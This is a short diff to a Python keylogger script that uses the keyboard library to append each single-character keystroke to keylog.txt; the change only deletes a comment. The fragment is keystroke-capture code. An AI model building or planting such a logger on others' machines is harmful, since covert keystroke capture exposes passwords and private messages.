@@ -4,7 +4,7 @@ import keyboard
 
 def log_keystrokes(event):
     key = event.name
-    if len(key) == 1:  # Ignore special keys like 'Ctrl', 'Shift', etc.
+    if len(key) == 1:
         with open("keylog.txt", "a") as f:
             f.write(key)
 
